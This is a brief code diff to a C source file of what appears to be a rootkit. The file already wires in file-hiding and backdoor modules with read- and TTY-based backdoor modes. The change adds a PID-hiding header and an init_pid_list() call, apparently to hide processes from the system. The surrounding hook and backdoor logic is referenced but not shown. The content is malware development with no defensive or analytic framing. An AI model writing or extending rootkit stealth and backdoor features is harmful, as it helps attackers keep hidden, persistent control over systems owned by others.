@@ -10,6 +10,7 @@
 #include "rootkit.h"
 #include "filehide.h"
 #include "backdoor.h"
+#include "hidepid.h"
 
 extern rootkit_t rootkit;
 
@@ -56,6 +57,8 @@ init_hooks(void)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
         backdoor_tty();
+
+    init_pid_list();
 }
 
 void
